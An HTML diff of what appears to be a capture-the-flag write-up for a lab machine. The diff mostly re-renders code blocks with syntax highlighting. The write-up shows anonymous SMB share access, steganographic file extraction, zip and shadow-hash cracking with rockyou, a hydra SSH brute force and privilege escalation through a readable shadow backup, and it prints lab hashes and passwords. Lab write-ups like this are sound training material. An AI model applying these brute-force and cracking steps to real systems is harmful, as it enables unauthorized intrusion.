@@ -122,25 +122,25 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT    STATE SERVICE      REASON
-22/tcp  open  ssh          syn-ack ttl 62
-139/tcp open  netbios-ssn  syn-ack ttl 62
-445/tcp open  microsoft-ds syn-ack ttl 62
+<div class="codehilite"><pre><span></span><code><span class="n">PORT</span><span class="w">    </span><span class="n">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="n">REASON</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">          </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">62</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">  </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">62</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">62</span>
 
-Host script results:
-| smb-enum-shares: 
-|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
-|   account_used: &lt;blank&gt;
-|   \\10.64.149.126\IPC$: 
-|     Type: STYPE_IPC_HIDDEN
-|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
-|     Users: 1
-|     Max Users: &lt;unlimited&gt;
-|     Path: C:\tmp
-|_    Anonymous access: READ/WRITE
-</code></pre>
+<span class="n">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="p">:</span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">shares</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="n">note</span><span class="p">:</span><span class="w"> </span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">shares</span><span class="w"> </span><span class="n">failed</span><span class="p">,</span><span class="w"> </span><span class="n">guessing</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">common</span><span class="w"> </span><span class="n">ones</span><span class="w"> </span><span class="p">(</span><span class="n">SMB</span><span class="p">:</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">receive</span><span class="w"> </span><span class="n">bytes</span><span class="p">:</span><span class="w"> </span><span class="n">TIMEOUT</span><span class="p">)</span>
+<span class="o">|</span><span class="w">   </span><span class="n">account_used</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">blank</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">   </span>\\<span class="mf">10.64</span><span class="o">.</span><span class="mf">149.126</span>\<span class="n">IPC</span><span class="o">$</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">STYPE_IPC_HIDDEN</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Comment</span><span class="p">:</span><span class="w"> </span><span class="n">IPC</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="p">(</span><span class="n">Samba</span><span class="w"> </span><span class="mf">4.7</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Users</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Max</span><span class="w"> </span><span class="n">Users</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unlimited</span><span class="o">&gt;</span>
+<span class="o">|</span><span class="w">     </span><span class="n">Path</span><span class="p">:</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>
+<span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Anonymous</span><span class="w"> </span><span class="n">access</span><span class="p">:</span><span class="w"> </span><span class="n">READ</span><span class="o">/</span><span class="n">WRITE</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>smbclient //10.64.149.126/Anonymous -N -t 900
+<div class="codehilite"><pre><span></span><code>smbclient //10.64.149.126/Anonymous -N -t 900
 
 Anonymous login successful
 Try &quot;help&quot; to get a list of possible commands.
@@ -152,15 +152,15 @@ ge
                 10253588 blocks of size 1024. 4671704 blocks available
 smb: \&gt; get journal.txt
 getting file \journal.txt of size 3470998 as journal.txt (10.3 KiloBytes/sec) (average 10.3 KiloBytes/sec)
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>cat journal.txt | base64 -d &gt; output
+<div class="codehilite"><pre><span></span><code>cat journal.txt | base64 -d &gt; output
 
 file output
 output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>stegpy output         
+<div class="codehilite"><pre><span></span><code>stegpy output         
 File _journal.zip succesfully extracted from output
 
 unzip _journal.zip
@@ -175,32 +175,32 @@ ls
 journal.txt  _journal.zip  output
 
 fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal.zip
-found id d8ffd8ff, '_journal.zip' is not a zipfile ver 2.xx, skipping
+found id d8ffd8ff, &#39;_journal.zip&#39; is not a zipfile ver 2.xx, skipping
 no usable files found
-</code></pre>
+</code></pre></div>
 
 <p>it thinks it’s a JPEG…<br />
 Open it up in <code>hexeditor</code> and we’ll check to see if it’s had its magic number tampered with:</p>
 <p>Well, considering that the magic number for a standard <code>.zip</code> zipfile is <code>50 4B 03 04</code>, I have a feeling we might be right on the money with this one.</p>
 <p><code>file _journal.zip                                            
 _journal.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Feb 10 2020 00:01:42, uncompressed size 70434, method=deflate</code></p>
-<pre class="codehilite"><code>fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
+<div class="codehilite"><pre><span></span><code>fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
 PASSWORD FOUND!!!!: pw == september
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>/usr/share/john/7z2john.pl Journal.ctz &gt; hash.txt
+<div class="codehilite"><pre><span></span><code>/usr/share/john/7z2john.pl Journal.ctz &gt; hash.txt
 ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
+<div class="codehilite"><pre><span></span><code><span class="nv">john</span><span class="w"> </span><span class="nv">hash</span>.<span class="nv">txt</span><span class="w"> </span><span class="o">--</span><span class="nv">wordlist</span><span class="o">=/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">share</span><span class="o">/</span><span class="nv">wordlists</span><span class="o">/</span><span class="nv">rockyou</span>.<span class="nv">txt</span>
+<span class="nv">Using</span><span class="w"> </span><span class="nv">default</span><span class="w"> </span><span class="nv">input</span><span class="w"> </span><span class="nv">encoding</span>:<span class="w"> </span><span class="nv">UTF</span><span class="o">-</span><span class="mi">8</span>
 
-Press 'q' or Ctrl-C to abort, almost any other key for status
-tigerlily        (Journal.ctz)     
-1g 0:00:01:55 DONE (2025-12-24 12:47) 0.008660g/s 48.49p/s 48.49c/s . 
-</code></pre>
+<span class="nv">Press</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span><span class="nv">or</span><span class="w"> </span><span class="nv">Ctrl</span><span class="o">-</span><span class="nv">C</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">abort</span>,<span class="w"> </span><span class="nv">almost</span><span class="w"> </span><span class="nv">any</span><span class="w"> </span><span class="nv">other</span><span class="w"> </span><span class="nv">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">status</span>
+<span class="nv">tigerlily</span><span class="w">        </span><span class="ss">(</span><span class="nv">Journal</span>.<span class="nv">ctz</span><span class="ss">)</span><span class="w">     </span>
+<span class="mi">1</span><span class="nv">g</span><span class="w"> </span><span class="mi">0</span>:<span class="mi">00</span>:<span class="mi">01</span>:<span class="mi">55</span><span class="w"> </span><span class="nv">DONE</span><span class="w"> </span><span class="ss">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="w"> </span><span class="mi">12</span>:<span class="mi">47</span><span class="ss">)</span><span class="w"> </span><span class="mi">0</span>.<span class="mi">008660</span><span class="nv">g</span><span class="o">/</span><span class="nv">s</span><span class="w"> </span><span class="mi">48</span>.<span class="mi">49</span><span class="nv">p</span><span class="o">/</span><span class="nv">s</span><span class="w"> </span><span class="mi">48</span>.<span class="mi">49</span><span class="nv">c</span><span class="o">/</span><span class="nv">s</span><span class="w"> </span>.<span class="w"> </span>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ 7z e Journal.ctz
+<div class="codehilite"><pre><span></span><code>└─$ 7z e Journal.ctz
 
 7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
  64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM
@@ -224,65 +224,65 @@ Everything is Ok
 
 Size:       158136
 Compressed: 70434
-</code></pre>
+</code></pre></div>
 
 <p>now can open <code>Journal.ctd</code> and find more info and can find user and can be found some wordlists that user used to create pwds</p>
 <p>so i decode all and make all that wordlists and use into  bruteforce user ssh</p>
-<pre class="codehilite"><code>└─$ hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
-Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">lily</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">cherry</span><span class="o">-</span><span class="n">blossom</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="nl">ssh</span><span class="p">:</span><span class="o">//</span><span class="mf">10.64.149.126</span>
+<span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.5</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">David</span><span class="w"> </span><span class="n">Maciejak</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">non</span><span class="o">-</span><span class="n">binding</span><span class="p">,</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="o">***</span><span class="w"> </span><span class="k">ignore</span><span class="w"> </span><span class="n">laws</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">ethics</span><span class="w"> </span><span class="n">anyway</span><span class="p">).</span>
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-24 13:18:42
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
-[DATA] attacking ssh://10.64.149.126:22/
-[22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-24 13:18:50
-</code></pre>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">18</span><span class="err">:</span><span class="mi">42</span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Many</span><span class="w"> </span><span class="n">SSH</span><span class="w"> </span><span class="n">configurations</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">parallel</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">recommended</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">reduce</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nl">tasks</span><span class="p">:</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">4</span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">task</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">task</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">1</span><span class="w"> </span><span class="k">try</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="nl">ssh</span><span class="p">:</span><span class="o">//</span><span class="mf">10.64.149.126</span><span class="err">:</span><span class="mi">22</span><span class="o">/</span>
+<span class="o">[</span><span class="n">22</span><span class="o">][</span><span class="n">ssh</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.64.149.126</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">lily</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="n">Mr</span><span class="p">.</span><span class="err">$</span><span class="n">un</span><span class="err">$</span><span class="n">hi</span><span class="p">..</span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">18</span><span class="err">:</span><span class="mi">50</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>[-] Location and Permissions (if accessible) of .bak file(s):
--rw------- 1 root shadow 771 Feb  9  2020 /var/backups/gshadow.bak
--r--r--r-- 1 root shadow 1481 Feb  9  2020 /var/backups/shadow.bak
--rw------- 1 root root 936 Feb  9  2020 /var/backups/group.bak
--rw------- 1 root root 2382 Feb  9  2020 /var/backups/passwd.bak
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="k">[</span><span class="nb">-</span><span class="k">]</span><span class="c"> Location and Permissions (if accessible) of </span><span class="nt">.</span><span class="c">bak file(s):</span>
+<span class="nb">-</span><span class="c">rw</span><span class="nb">-------</span><span class="c"> 1 root shadow 771 Feb  9  2020 /var/backups/gshadow</span><span class="nt">.</span><span class="c">bak</span>
+<span class="nb">-</span><span class="c">r</span><span class="nb">--</span><span class="c">r</span><span class="nb">--</span><span class="c">r</span><span class="nb">--</span><span class="c"> 1 root shadow 1481 Feb  9  2020 /var/backups/shadow</span><span class="nt">.</span><span class="c">bak</span>
+<span class="nb">-</span><span class="c">rw</span><span class="nb">-------</span><span class="c"> 1 root root 936 Feb  9  2020 /var/backups/group</span><span class="nt">.</span><span class="c">bak</span>
+<span class="nb">-</span><span class="c">rw</span><span class="nb">-------</span><span class="c"> 1 root root 2382 Feb  9  2020 /var/backups/passwd</span><span class="nt">.</span><span class="c">bak</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>/var/backups/shadow.bak
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="o">/</span><span class="n">shadow</span><span class="o">.</span><span class="n">bak</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
+<div class="codehilite"><pre><span></span><code>johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
 lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
 sshd:*:18301:0:99999:7:::
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>john --wordlist=cherry-blossom.txt hashes.txt
+<div class="codehilite"><pre><span></span><code><span class="n">john</span><span class="w"> </span><span class="o">--</span><span class="n">wordlist</span><span class="o">=</span><span class="n">cherry</span><span class="o">-</span><span class="n">blossom</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="n">hashes</span><span class="o">.</span><span class="n">txt</span>
 
-Using default input encoding: UTF-8
-Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
-Cost 1 (iteration count) is 5000 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-Mr.$un$hin3      (lily)     
-##scuffleboo##   (johan)     
-2g 0:00:00:03 DONE (2025-12-24 13:42) 0.5988g/s 2146p/s 2299c/s 2299C/s #shauna#..#imab#3899261#
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed. 
-</code></pre>
+<span class="n">Using</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">encoding</span><span class="p">:</span><span class="w"> </span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Loaded</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">different</span><span class="w"> </span><span class="n">salts</span><span class="w"> </span><span class="p">(</span><span class="n">sha512crypt</span><span class="p">,</span><span class="w"> </span><span class="n">crypt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="o">$</span><span class="mi">6</span><span class="o">$</span><span class="w"> </span><span class="p">[</span><span class="n">SHA512</span><span class="w"> </span><span class="mi">256</span><span class="o">/</span><span class="mi">256</span><span class="w"> </span><span class="n">AVX2</span><span class="w"> </span><span class="mi">4</span><span class="n">x</span><span class="p">])</span>
+<span class="n">Cost</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">iteration</span><span class="w"> </span><span class="n">count</span><span class="p">)</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="mi">5000</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">loaded</span><span class="w"> </span><span class="n">hashes</span>
+<span class="n">Will</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">OpenMP</span><span class="w"> </span><span class="n">threads</span>
+<span class="n">Press</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">abort</span><span class="p">,</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">status</span>
+<span class="n">Mr</span><span class="o">.$</span><span class="n">un</span><span class="o">$</span><span class="n">hin3</span><span class="w">      </span><span class="p">(</span><span class="n">lily</span><span class="p">)</span><span class="w">     </span>
+<span class="c1">##scuffleboo##   (johan)     </span>
+<span class="mi">2</span><span class="n">g</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">03</span><span class="w"> </span><span class="n">DONE</span><span class="w"> </span><span class="p">(</span><span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">24</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">42</span><span class="p">)</span><span class="w"> </span><span class="mf">0.5988</span><span class="n">g</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">2146</span><span class="n">p</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">2299</span><span class="n">c</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">2299</span><span class="n">C</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="c1">#shauna#..#imab#3899261#</span>
+<span class="n">Use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="s2">&quot;--show&quot;</span><span class="w"> </span><span class="n">option</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">cracked</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="n">reliably</span>
+<span class="n">Session</span><span class="w"> </span><span class="n">completed</span><span class="o">.</span><span class="w"> </span>
+</code></pre></div>
 
-<pre class="codehilite"><code>lily@cherryblossom:~$ su johan
-Password: 
+<div class="codehilite"><pre><span></span><code><span class="n">lily</span><span class="nv">@cherryblossom</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">johan</span>
+<span class="nl">Password</span><span class="p">:</span><span class="w"> </span>
 
-johan@cherryblossom:~$ ls -la
-total 48
+<span class="n">johan</span><span class="nv">@cherryblossom</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">48</span>
 
--rw-rw-r--  1 johan johan   38 Feb 10  2020 user.txt
--rw-rw-r--  1 johan johan  180 Feb  9  2020 .wget-hsts
-johan@cherryblossom:~$ cat user.txt
-</code></pre>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">johan</span><span class="w"> </span><span class="n">johan</span><span class="w">   </span><span class="mi">38</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">10</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">johan</span><span class="w"> </span><span class="n">johan</span><span class="w">  </span><span class="mi">180</span><span class="w"> </span><span class="n">Feb</span><span class="w">  </span><span class="mi">9</span><span class="w">  </span><span class="mi">2020</span><span class="w"> </span><span class="p">.</span><span class="n">wget</span><span class="o">-</span><span class="n">hsts</span>
+<span class="n">johan</span><span class="nv">@cherryblossom</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
 
 <p><code>CVE-2019-18364</code></p>
-<pre class="codehilite"><code>root/root.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code>root/root.txt
+</code></pre></div>
         </div>
     </main>
 
